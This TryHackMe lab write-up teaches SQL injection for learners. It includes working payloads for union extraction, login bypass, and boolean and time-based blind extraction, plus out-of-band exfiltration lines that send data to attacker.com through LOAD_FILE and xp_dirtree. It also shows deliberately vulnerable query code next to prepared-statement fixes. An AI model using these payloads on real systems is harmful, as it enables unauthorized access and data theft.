# 💉 SQL Injection Introduction — TryHackMe Writeup

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)
![Category](https://img.shields.io/badge/Category-Web%20App%20Security-blue?style=for-the-badge)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)
![OWASP](https://img.shields.io/badge/OWASP-A05%3A2025%20Injection-orange?style=for-the-badge)

> **Room:** [SQL Injection Introduction](https://tryhackme.com/room/sqlinjectionintroduction) — TryHackMe
> **Author of writeup:** *Your Name Here*
> **Purpose:** A ground-up breakdown of SQL Injection — from the core syntax that makes it possible, through detection, all three injection classes (In-Band, Blind, Out-of-Band), to the practical 4-level lab and the real fix (prepared statements).

---

## 📑 Table of Contents

- [Introduction](#-introduction)
- [SQL Essentials for Injection](#-sql-essentials-for-injection)
- [What is SQL Injection?](#-what-is-sql-injection)
- [In-Band SQL Injection](#-in-band-sql-injection)
- [Blind SQLi: Authentication Bypass](#-blind-sqli-authentication-bypass)
- [Blind SQLi: Boolean & Time-Based](#-blind-sqli-boolean--time-based)
- [Out-of-Band SQL Injection](#-out-of-band-sql-injection)
- [Remediation & Prevention](#-remediation--prevention)
- [Practical Lab Walkthrough](#-practical-lab-walkthrough-4-levels)
- [Quick Revision Cheat Sheet](#-quick-revision-cheat-sheet)
- [Key Takeaways](#-key-takeaways)

---

## 📝 Introduction

SQL Injection (SQLi) sits under **[OWASP A05:2025 – Injection](https://owasp.org/Top10/2025/A05_2025-Injection/)** and remains one of the most dangerous — and oldest — web vulnerabilities still found in modern applications. It happens whenever an attacker can manipulate the SQL queries a web app sends to its database, with consequences ranging from data theft to full authentication bypass to complete database takeover.

This room builds the concept from zero: the specific SQL syntax that enables injection → detection techniques → exploitation across every major SQLi type → and finally, how developers actually fix it.

**Prerequisite:** comfort with basic `SELECT`, `FROM`, `WHERE`, `ORDER BY` (covered in [Database SQL Basics](https://tryhackme.com/room/databasesqlbasics)).

---

## 🧩 SQL Essentials for Injection

Before crafting payloads, a few SQL building blocks need to be second nature:

| Feature | Why it matters for injection |
|---|---|
| **Comments** (`--`, `#`, `/* */`) | Cuts off the rest of the original query so leftover syntax doesn't break your payload |
| **`UNION`** | Appends a second `SELECT` to the original — the foundation of Union-Based SQLi. **Column count must match.** |
| **`LIKE` + wildcards** (`%`, `_`) | Pattern matching — used in Blind SQLi to enumerate data one character at a time |
| **`LIMIT`** | Controls which row(s) come back — `LIMIT offset, count` |
| **`group_concat()` / `CONCAT()`** | Squashes multiple rows/columns into a single string so everything fits through one output field |
| **`information_schema`** | The database's built-in map of itself — `.tables` and `.columns` reveal every table/column on the server |

> ⚠️ This room uses **MySQL** syntax throughout. Other engines (MSSQL, PostgreSQL, SQLite, Oracle) share the same concepts but differ in comment style, system tables, and functions.

### 🔹 The comment trick, visually

```sql
-- Original query:
SELECT * FROM users WHERE username='INPUT' AND password='secret';

-- Injecting admin'-- as the username:
SELECT * FROM users WHERE username='admin'-- AND password='secret';
-- Everything after -- is ignored → password check never runs
```

---

## 🔓 What is SQL Injection?

**Core issue:** the application concatenates user input **directly** into a SQL query instead of treating it as pure data. The attacker's input becomes executable SQL rather than a harmless value.

```php
// Vulnerable pattern
$query = "SELECT * FROM articles WHERE id = " . $_GET['id'] . " AND public = 1;";
```

`?id=1 OR 1=1--` turns this into:

```sql
SELECT * FROM articles WHERE id = 1 OR 1=1-- AND public = 1;
```

`OR 1=1` makes the `WHERE` clause always true, and `--` comments out the `public = 1` check — every article, public or not, comes back.

### 🔹 The three flavours of SQLi

| Type | How feedback is received |
|---|---|
| **In-Band** | Results appear directly in the response — via errors (**Error-Based**) or `UNION` output (**Union-Based**) |
| **Blind** | No visible output — inferred from behaviour: login success/fail (**Auth Bypass**), content differences (**Boolean-Based**), or delay (**Time-Based**) |
| **Out-of-Band (OOB)** | Database makes an external DNS/HTTP request to exfiltrate data through a separate channel |

### 🔹 Detecting it

- Inject `'` → database error = likely injectable
- Inject `"` → some apps wrap input in double quotes instead
- Inject `;--` → different behaviour = comment syntax is being processed
- Inject `OR 1=1` → changed results = input sits directly inside query logic

---

## 🎯 In-Band SQL Injection

The most common and easiest category — you inject and see results in the same channel.

### 🔹 Error-Based
Misconfigured apps leak raw DB errors on a bad input like a lone `'`, revealing the engine type, quoting style, and query structure — useful recon before a full Union attack.

### 🔹 Union-Based — the extraction method

| Step | Goal | Example |
|---|---|---|
| 1 | Find column count | `1 UNION SELECT 1,2,3` (no error = 3 columns) |
| 2 | Find the *displayed* column | `0 UNION SELECT 1,2,3` → see which number renders on the page |
| 3 | Get database name | `0 UNION SELECT 1,2,database()` |
| 4 | Enumerate tables | `... FROM information_schema.tables WHERE table_schema='db_name'` |
| 5 | Enumerate columns | `... FROM information_schema.columns WHERE table_name='target_table'` |
| 6 | Extract data | `... group_concat(username,':',password) FROM target_table` |

Using `0` (or `-1`) as the ID forces the *original* query to return nothing, so only your injected `UNION` row is rendered.

---

## 🔑 Blind SQLi: Authentication Bypass

**Core issue:** the app never shows query results — only "logged in" or "invalid credentials." The database still processes the injection; you just can't see the output directly.

A typical login query:

```sql
SELECT * FROM users WHERE username='bob' AND password='secret123' LIMIT 1;
```

### 🧪 The classic bypass

Username: `' OR 1=1;--`, password: anything →

```sql
SELECT * FROM users WHERE username='' OR 1=1;--' AND password='anything' LIMIT 1;
```

| Piece | Effect |
|---|---|
| `username=''` | matches nothing on its own |
| `OR 1=1` | always true → whole `WHERE` clause is true |
| `;--` | ends the statement, comments out the password check |

Result: every row returns, the app logs you in as whichever user comes first — often the admin.

### 🔹 Targeting a specific account
`admin'--` as the username comments out the password check entirely, logging you straight into the **admin** row without ever knowing the password.

### 🔹 Payload variations to try
`' OR 1=1;--` · `' OR 1=1#` (MySQL alt comment) · `" OR 1=1--` (double-quoted queries) · test both username *and* password fields, since only one may actually reach the query.

---

## 🧠 Blind SQLi: Boolean & Time-Based

For when auth bypass isn't the goal — you want to **pull actual data** out with zero visible query output.

### 🔹 Boolean-Based

The app gives a binary signal — e.g. a username-check endpoint returning `{"taken":true}` or `{"taken":false}`.

```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 's%';--
```

Flip through letters (`a%`, `b%`, ... `s%`) watching the true/false flag flip. Once the first character is confirmed, lock it in and move to the second (`sa%`, `sb%`, `sq%`...) — repeat for the database name, then table names via `information_schema.tables`, then column names via `information_schema.columns`, then the actual data. Slow, but completely reliable.

### 🔹 Time-Based

Used when the response is **byte-for-byte identical** no matter what you inject — same content, same status code. The only signal left is **response time**.

```sql
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';--
```

A ~5 second delay = true. Instant response = false. Same character-by-character methodology as Boolean-Based, just measured with a stopwatch instead of the page content.

> ⚠️ Network jitter can produce false positives — use longer sleeps (5–10s) and re-test each character. MSSQL equivalent: `WAITFOR DELAY '0:0:5'`.

| Scenario | Technique |
|---|---|
| Page content visibly differs true vs false | Boolean-Based |
| Page looks 100% identical either way | Time-Based |
| Time-based blocked/unreliable | Out-of-Band |

---

## 📡 Out-of-Band SQL Injection

**Core issue:** used only when In-Band, Boolean, and Time-Based are all dead ends — but the database server itself has outbound network access. Data is smuggled out through a **separate channel** (usually DNS or HTTP) rather than the web response.

### 🔹 MySQL DNS exfiltration via `LOAD_FILE()`

```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));
```

This builds a UNC path containing the database name as a subdomain (`webapp_db.attacker.com`) — the resulting DNS lookup is caught and logged on an attacker-controlled DNS server.

### 🔹 MSSQL techniques
- `xp_dirtree '\\attacker.com\share'` → triggers a DNS lookup
- `xp_cmdshell 'nslookup data.attacker.com'` → runs OS commands directly (disabled by default in modern MSSQL)

### 🔹 Catching the callback
Burp Collaborator, self-hosted **Interactsh**, or a custom Python DNS/HTTP listener.

**Limitations:** requires DB server outbound access, payloads are engine-specific, DNS subdomain labels cap at 63 characters, and it's generally slower/flakier than direct extraction.

---

## 🛡️ Remediation & Prevention

| Defence | Notes |
|---|---|
| **Prepared statements (parameterised queries)** | *The* real fix — separates SQL code from data entirely. `?` / `%s` placeholders mean user input can never alter query structure |
| **Input validation (allowlisting)** | Reject anything that doesn't match the expected type (e.g. `ctype_digit()` for a numeric ID). Blocklisting single characters is brittle and bypassable |
| **Escaping user input** | Fragile, engine-specific — last resort for legacy code that can't be refactored |
| **Principle of least privilege** | The app's DB account should only have the permissions it needs (e.g. `SELECT` only) — limits blast radius if injection does occur |
| **Web Application Firewall (WAF)** | Blocks known patterns (`OR 1=1`, `UNION SELECT`) — an extra layer, not a substitute for secure code |

**Vulnerable → Fixed (PHP/PDO):**

```php
// Vulnerable
$query = "SELECT * FROM users WHERE username='" . $_POST['username'] . "'";

// Fixed
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_POST['username']]);
```

**Vulnerable → Fixed (Python):**

```python
# Vulnerable
query = f"SELECT * FROM users WHERE username='{username}'"

# Fixed
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

---

## 🧪 Practical Lab Walkthrough (4 Levels)

The lab deploys a mock browser with a live-updating **SQL Query** box, so every keystroke shows exactly how your input reshapes the real query. Levels are sequential — each unlocks the next.

| Level | Technique | Injection Point | What You Do |
|---|---|---|---|
| **1** | Union-Based (In-Band) | `article?id=` URL parameter | Find column count → make `UNION` output visible with `id=0` → pull `database()` → enumerate `information_schema.tables` → enumerate columns → `group_concat()` credentials out of `staff_users` |
| **2** | Authentication Bypass (Blind) | Login form username field | `' OR 1=1;--` logs you in without any valid credentials — password field becomes irrelevant once commented out |
| **3** | Boolean-Based (Blind) | Username-check API (`{"taken":true/false}`) | Confirm injection with a `LIKE '%'` always-true check, then extract the database name, table (`users`), columns, and full admin credentials one character at a time |
| **4** | Time-Based (Blind) | HTTP `Referrer` header | Identical responses regardless of input — `SLEEP()` delays are the only signal. Same character-by-character enumeration as Level 3, but timed instead of read |

> 💡 In a real engagement, this manual process is exactly what **SQLmap** automates. Doing it by hand once, though, is what makes clear *why* each step works — and where it breaks against targets that rate-limit or block automated tools.

---

## ⚡ Quick Revision Cheat Sheet

```
SQLi CATEGORY           →  SUBTYPE                →  FEEDBACK CHANNEL
──────────────────────────────────────────────────────────────────────
In-Band                 →  Error-Based             →  Raw DB error messages
In-Band                 →  Union-Based             →  UNION output on the page
Blind                    →  Auth Bypass             →  Logged in / not logged in
Blind                    →  Boolean-Based           →  Page content true/false signal
Blind                    →  Time-Based              →  Response delay (SLEEP)
Out-of-Band              →  DNS/HTTP Exfiltration   →  External callback to attacker server

CORE BUILDING BLOCKS     →  PURPOSE
──────────────────────────────────────────────────────────────────────
--  /  #  /* */          →  Comment out leftover query syntax
UNION SELECT             →  Append attacker-controlled SELECT (columns must match)
LIKE 'x%'                →  Character-by-character enumeration in Blind SQLi
group_concat()           →  Squash multi-row/column results into one string
information_schema       →  Database's own map: tables, columns, schemas
SLEEP(n)                 →  Time-based true/false signal

METHODOLOGY (UNION-BASED)         →  STEP
──────────────────────────────────────────────────────────────────────
1 UNION SELECT 1,2,3              →  Find column count
0 UNION SELECT 1,2,3              →  Identify displayed column
0 UNION SELECT 1,2,database()     →  Get current database name
... FROM information_schema.tables    →  Enumerate tables
... FROM information_schema.columns   →  Enumerate columns
... group_concat(user,':',pass)   →  Extract credentials

THE FIX                 →  detail
──────────────────────────────────────────────────────────────────────
Prepared statements     →  Separates SQL code from data — the real defence
Input validation        →  Allowlist expected format, reject everything else
Least privilege         →  DB account gets only the permissions it needs
WAF                     →  Extra layer only, never a substitute for secure code
```

---

## 🎯 Key Takeaways

- **SQL Injection is fundamentally about trust** — the moment user input is concatenated straight into a query string instead of being treated as pure data, the attacker can rewrite the query's logic.
- **In-Band** is the loudest and easiest to exploit — if you can see `UNION` output or error messages, extraction is fast.
- **Blind SQLi** proves injection doesn't need visible output at all — a true/false signal (or a stopwatch, for Time-Based) is enough to pull an entire database out one character at a time.
- **Out-of-Band** is the last resort when every other channel is shut down, but it depends entirely on the database server having outbound network access.
- **`information_schema` is the master key** — once injection is confirmed, it's how you go from "I can inject" to "I know every table and column on this server."
- **The only real fix is prepared statements.** Input validation, escaping, least privilege, and WAFs are all valuable defence-in-depth — but none of them replace parameterised queries.

---

<p align="center">
  <i>📌 Part of my TryHackMe learning journey — companion piece to the OWASP Top 10 2025: IAAA Failures writeup, this one dives into A05:2025 Injection specifically through SQL Injection.</i>
</p>
